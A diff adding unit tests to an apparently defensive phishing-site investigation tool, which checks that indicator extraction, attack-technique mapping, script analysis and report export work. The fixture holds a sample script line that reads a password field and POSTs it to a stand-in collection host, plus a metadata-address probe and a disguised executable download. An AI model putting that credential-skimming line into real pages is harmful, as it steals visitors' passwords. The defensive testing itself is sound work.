@@ -167,3 +167,38 @@ def test_rate_limit_blocks_the_16th_scan_in_an_hour():
     import pytest
     with pytest.raises(HTTPException):
         server.rate_limit(R(), "scan-test", 15)
+
+
+def _case(**kw):
+    c = {"url": "http://cloaked-promo.test:8601/", "start_host": "cloaked-promo.test", "level": "DANGEROUS", "score": 100, "hosts": {"cloaked-promo.test": 3, "drop-zone.test": 1},
+         "leaks": [{"host": "drop-zone.test", "data": ["PASSWORD"], "urls": ["http://drop-zone.test:8601/collect"]}], "blocked": [{"url": "http://169.254.169.254/x", "reason": "r"}],
+         "redirects": [{"from": "http://go-short.test/x", "to": "http://cloaked-promo.test/", "status": 302}], "downloads": [{"filename": "Invoice.pdf.exe", "sha256": "ab" * 32}],
+         "scripts": ["document.getElementById('password').value; fetch('http://drop-zone.test:8601/collect', {method:'POST'}); location.href='/done'"],
+         "script_srcs": [], "hidden_orders": [], "evidence_kinds": ["credentials_sent_elsewhere", "cloaking", "download", "internal_probe"], "evidence": ["x"], "swarm": [], "memory_campaign": ["go-short.test"]}
+    c.update(kw)
+    return c
+
+
+def test_investigation_iocs_and_techniques_come_from_the_evidence():
+    from decoy import investigate as inv
+    ic = inv.iocs(_case())
+    vals = {(i["type"], i["value"]) for i in ic}
+    assert ("domain", "drop-zone.test") in vals and ("sha256", "ab" * 32) in vals and ("ip", "169.254.169.254") in vals and ("domain", "go-short.test") in vals
+    ids = {t["id"] for t in inv.techniques(_case())}
+    assert {"T1566.002", "T1056.003", "T1204.002", "T1552.005", "T1036.007"} <= ids
+
+
+def test_script_reverse_engineering_rules_and_hallucination_guard():
+    from decoy import investigate as inv
+    f = inv.static_script_findings(_case()["scripts"])
+    assert any("sends data out" in x for x in f) and any("reads what the visitor types" in x for x in f) and any("redirects" in x for x in f)
+    assert inv._clean(["Data went to evil-invented.com", "Data went to drop-zone.test"], {"drop-zone.test"}) == ["Data went to drop-zone.test"]
+
+
+def test_report_without_a_model_is_complete_and_exports_markdown():
+    from decoy import investigate as inv
+    from decoy.guard import Budget
+    rep = inv.report(_case(), [{"id": "n", "name": "Network analyst", "findings": ["x"], "by": "rules"}], Budget(), False)
+    assert rep["headline"] and len(rep["how_it_works"]) >= 3 and rep["actions"] and rep["iocs"]
+    assert "drop-zone.test" in inv.to_markdown(rep) and "Indicators of compromise" in inv.to_markdown(rep)
+    assert all("PASSWORD" not in str(i["value"]) for i in rep["iocs"])
